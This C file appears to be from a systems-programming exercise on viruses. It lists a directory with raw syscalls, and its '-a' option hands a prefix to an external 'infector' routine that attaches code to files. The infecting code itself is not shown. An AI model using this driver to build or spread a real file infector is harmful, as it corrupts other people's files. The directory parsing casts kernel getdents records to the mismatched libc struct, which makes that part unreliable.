#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <dirent.h>  // Standard directory handling header
#include <errno.h>
#include <stdlib.h>
#include <string.h>  // For strlen

#define BUF_SIZE 8192
#define EXIT_ERROR 0x55

extern void infection();
extern void infector(char* prefix);

// List the contents of a directory using SYS_getdents
void list_directory() {
    int fd = open(".", O_RDONLY | O_DIRECTORY);  // Open the current directory
    if (fd < 0) {
        syscall(SYS_exit, EXIT_ERROR, 0, 0);  // Use syscall directly
    }

    char buf[BUF_SIZE];
    int nread = syscall(SYS_getdents, fd, buf, BUF_SIZE);  // Read the directory entries
    if (nread < 0) {
        close(fd);
        syscall(SYS_exit, EXIT_ERROR, 0, 0);  // Handle error
    }

    for (int bpos = 0; bpos < nread;) {
        struct dirent *d = (struct dirent *)(buf + bpos);  // Cast to struct dirent
        char d_type = *(buf + bpos + d->d_reclen - 1);  // Get the type

        if (d_type == DT_REG || d_type == DT_DIR) {  // Regular files or directories
            syscall(SYS_write, STDOUT_FILENO, d->d_name, strlen(d->d_name));  // Write the filename
            syscall(SYS_write, STDOUT_FILENO, "\n", 1);  // Print a newline
        }

        bpos += d->d_reclen;  // Move to the next record in the buffer
    }

    close(fd);  // Close the directory file descriptor
}


int main(int argc, char *argv[]) {
    if (argc == 1) {
        list_directory();  // No -a argument, list directory
    } else if (argc == 2 && argv[1][0] == '-' && argv[1][1] == 'a') {
        char *prefix = &argv[1][2];  // Extract prefix after -a
        infector(prefix);        // Implement attaching logic
    } else {
        syscall(SYS_exit, EXIT_ERROR, 0, 0);  // Invalid arguments
    }

    return 0;
}
